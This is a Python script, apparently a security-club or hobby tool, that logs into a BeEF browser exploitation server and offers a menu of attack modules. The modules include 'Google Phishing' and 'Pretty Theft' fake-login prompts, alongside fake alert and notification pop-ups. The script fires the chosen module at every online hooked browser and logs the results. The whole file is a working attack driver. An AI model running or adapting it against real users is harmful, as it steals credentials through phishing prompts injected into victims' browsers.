import os
from dotenv import load_dotenv
from beef_api import BeefAPI, ResultPoller


load_dotenv()


TARGET_EXPLOIT_NAMES = ["Create Alert Dialog", "Google Phishing",
                        "Pretty Theft", "Fake Notification Bar"]

HOST_NAME = os.getenv("HOST_NAME", "https://beef.nullsecsig.com")
LOGIN_NAME = os.getenv("LOGIN_NAME")
PASSWORD = os.getenv("PASSWORD")
LOG_PATH = os.getenv("LOG_PATH", "./results.log")

if LOGIN_NAME == None:
    LOGIN_NAME = input("Login name: ")
if PASSWORD == None:
    PASSWORD = input("Password: ")


beef = BeefAPI(HOST_NAME)
result_poller = ResultPoller(beef, LOG_PATH)

beef.login(LOGIN_NAME, PASSWORD)
result_poller.start()

target_exploits = beef.get_exploits_of_names(TARGET_EXPLOIT_NAMES)

while True:
    # Print menu
    for count, exploit_name in enumerate(TARGET_EXPLOIT_NAMES, 1):
        print(f"[{count}] {exploit_name}")
    print("[0] Quit")

    # Get user input
    while True:
        try:
            exploit_index = int(input("Choose an exploit: "))
            break
        except:
            print("invalid input! Please try again.")
            continue

    # Quit
    if exploit_index == 0:
        break

    online_sessions = beef.get_online_sessions()
    online_session_ids = [session["session"]
                          for session in online_sessions.values()]

    commands = beef.execute_exploit(online_session_ids,
                                    target_exploits[TARGET_EXPLOIT_NAMES[exploit_index - 1]]["id"])
    result_poller.add_recent(commands)
